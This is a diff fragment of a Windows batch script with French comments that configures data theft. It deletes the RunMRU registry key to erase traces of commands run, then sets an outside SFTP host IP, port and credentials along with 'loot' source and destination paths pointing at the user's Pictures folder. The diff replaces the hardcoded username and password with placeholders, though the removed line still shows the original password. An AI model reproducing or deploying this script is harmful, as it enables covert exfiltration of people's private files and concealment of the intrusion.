@@ -6,8 +6,8 @@ rem mettre des guillemets pour le mot de passe !
 rem mettre une redirection > C:\Temp\test.txt pour debug
 REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
 SET sftphost=185.178.48.116
-SET sftpuser=userftp
-SET sftppass="18^2zg98yt"
+SET sftpuser=XXXX
+SET sftppass="XXXX"
 SET sftpport=31569
 SET lootfrom=%userprofile%\Pictures
 SET looto=/ftp
